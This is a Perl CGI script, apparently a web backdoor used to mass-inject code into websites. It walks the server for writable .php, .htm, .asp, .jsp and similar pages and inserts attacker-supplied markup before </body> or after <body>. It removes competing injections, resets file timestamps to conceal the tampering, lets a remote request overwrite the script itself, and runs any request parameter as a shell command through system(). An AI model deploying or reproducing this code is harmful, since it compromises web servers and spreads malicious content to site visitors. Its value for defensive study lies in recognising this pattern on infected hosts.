#!/usr/bin/perl
use File::stat;
use File::Copy;
use File::Find;

sub ReadParse
{
	local (*in) = @_ if @_;
	local ($i, $loc, $key, $val);

	if($ENV{'REQUEST_METHOD'} eq "GET")
	{
		$in = $ENV{'QUERY_STRING'};
	}
	elsif($ENV{'REQUEST_METHOD'} eq "POST")
	{
		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
	}
      
	@in = split(/&/, $in);
	foreach $i (0 .. $#in)
	{
		$in[$i] =~ s/\+/ /g;
		($key, $val) = split(/=/, $in[$i], 2);
		$key =~ s/%(..)/pack("c", hex($1))/ge;
		$val =~ s/%(..)/pack("c", hex($1))/ge;
		$in{$key} .= "\0" if (defined($in{$key}));
		$in{$key} .= $val;
	}
}

sub PrintPageHeader
{
	print "Content-type: text/html\n\n";
}

sub ExecuteCommand
{
	print "<html><body>";
	if ($in{'update1'})
	{
		open (FILE, './data') or die "No data file";
		while (<FILE>)
		{
			chomp;
			if ($_ ne '') {$filepath = $_;}
		}
		close (FILE);
		if ($in{'getfiles'}) {Include ($filepath,$in{'update1'},1);}
		else { Include ($filepath,$in{'update1'},0);}
	}
	if ($in{'add1'})
	{
		open (FILE, './data') or die "No data file";
		while (<FILE>)
		{
			chomp;
			if ($_ ne '') {$filepath = $_;}
		}
		close (FILE);
		if ($in{'getfiles'}) {Ads ($filepath,$in{'add1'},1);}
		else { Ads ($filepath,$in{'add1'},0);}
	}
	Upgrade ($in{'update2'}) if ($in{'update2'});
	Run ($in{'update3'}) if ($in{'update3'});
	$string = "621tset";
	$reversed = reverse $string;
	print "<!--$reversed-->";
	#print "<!--".getpwuid($<)."-->";
	print "</font></body></html>";
}

sub Include ($$$)
{
	my $file = $_[0];
	my $code = $_[1];
	my $getfiles = $_[2];
	my @filepath;
	if (length($code) > 1)
	{
		$code = "<b1>".$code."</b1>";
	}
	
	if ($getfiles == 1)
	{
		my $pos = rindex($file, "/");
		my $dir = substr($file, 0, $pos);
		
		File::Find::find(
		sub {
			if (-f && -w) {
				if (/\.ph.*$/ || /\.htm.*$/ || /\.shtm.*$/ || /\.asp.*$/ || /\.jsp$/ || /\.jhtm$/ || /\.cfm$/ || /\.ctp$/ || /\.tpl$/)
				{
				push (@filepath,$File::Find::name);
				return;
				}
			}
			},
			$dir
		);
	}
	else { push (@filepath,$file);}
	
	foreach my $file(@filepath)
	{
		if ( -e $file && -w $file)
		{
			my $inj = 0;
			my $trusted = 0;
			
			if($file =~ m/\.htm/i) { $trusted = 1;}
			
			$info = stat($file);
			$d_atime = $info->atime;
			$d_mtime = $info->mtime;
			$d_size = $info->size;
			
			open (FILE, $file);
			sysread (FILE, $index_code, $d_size);
			close (FILE);
			
			$index_code =~ s/(<bb1>.*<bb2>)//gis;
			$index_code =~ s/(<b1>.*<\/b1>)//gis;
			$index_code =~ s/(<script.*>.*String.fromCharCode.*<\/script>)//gis;
			$index_code =~ s/(<font style=.*overflow.*hidden.*>.*<\/script>)//gis;
				
			if ($index_code =~ m/<\/body>/i)
			{
				$index_code =~ s/<\/body>/$code<\/body>/i;
				$inj = 1;
			}
			elsif ($index_code =~ m/<\/html>/i)
			{
				$index_code =~ s/<\/html>/$code<\/body><\/html>/i;
				$inj = 1;
			}
			
			if ($trusted == 1 && $inj == 0)
			{
				$index_code = $index_code.$code."</body></html>";
				$inj = 1;
			}
			
			if ($inj == 1 && $file !~ m/file\.php/i)
			{
				open (TMP, ">$file");
				print TMP $index_code;
				close (TMP);
				
				utime $d_atime, $d_mtime, $file;
				print "<pre>update $file</pre>";
			}
			#else { print "<!--no body in $file-->";}
		}
		else
		{
			print "<pre>no file $file</pre>";
		}
	}
}

sub Ads ($$$)
{
	my $file = $_[0];
	my $code = $_[1];
	my $getfiles = $_[2];
	my @filepath;
	if (length($code) > 1)
	{
		$code = "<ad>".$code."</ad>";
	}
	
	if ($getfiles == 1)
	{
		my $pos = rindex($file, "/");
		my $dir = substr($file, 0, $pos);
		
		File::Find::find(
		sub {
			if (-f && -w) {
				if (/\.ph.*$/ || /\.htm.*$/ || /\.shtm.*$/ || /\.asp.*$/ || /\.jsp$/ || /\.jhtm$/ || /\.cfm$/ || /\.ctp$/ || /\.tpl$/)
				{
				push (@filepath,$File::Find::name);
				return;
				}
			}
			},
			$dir
		);
	}
	else { push (@filepath,$file);}
	
	foreach my $file(@filepath)
	{
		if ( -e $file && -w $file)
		{
			my $inj = 0;
			
			$info = stat($file);
			$d_atime = $info->atime;
			$d_mtime = $info->mtime;
			$d_size = $info->size;
			
			open (FILE, $file);
			sysread (FILE, $index_code, $d_size);
			close (FILE);
			
			$index_code =~ s/(<ad>.*<\/ad>)//gim;
			$index_code =~ s/(<script.*>.*String.fromCharCode.*<\/script>)//gis;
			$index_code =~ s/(<font style=.*overflow.*hidden.*>.*<\/script>)//gis;
				
			if ($index_code =~ m/<body.*>/i)
			{
				$index_code =~ s/(<body.*>)/$1$code/i;
				$inj = 1;
			}
			else
			{
				$index_code = $code.$index_code;
				$inj = 1;
			}
			
			if ($trusted == 1 && $inj == 0)
			{
				$index_code = $index_code.$code."</body></html>";
				$inj = 1;
			}
			
			if ($inj == 1 && $file !~ m/file\.php/i)
			{
				open (TMP, ">$file");
				print TMP $index_code;
				close (TMP);
				
				utime $d_atime, $d_mtime, $file;
				print "<pre>update $file</pre>";
			}
			#else { print "<!--no body in $file-->";}
		}
		else
		{
			print "<pre>no file $file</pre>";
		}
	}
}

sub Upgrade ($)
{
	my $code = $_[0];
	
	if (move("./test.cgi", "./test_old.cgi"))
	{
		open (TMP, ">./test1.cgi");
		print TMP $code;
		close (TMP);
		system("tr -d '\15\32' < test1.cgi > test.cgi");
		$mode = 0755;   chmod $mode, './test.cgi';
		unlink('test1.cgi');
		print "<pre>upgrade</pre>";
	}
	else 
	{
		print "<pre>no</pre>";
	}
}

sub Run ($)
{
	my $cmd = $_[0];
	print "<pre>";
	system($cmd);
	print "</pre>";
}

&ReadParse;
&PrintPageHeader;
&ExecuteCommand;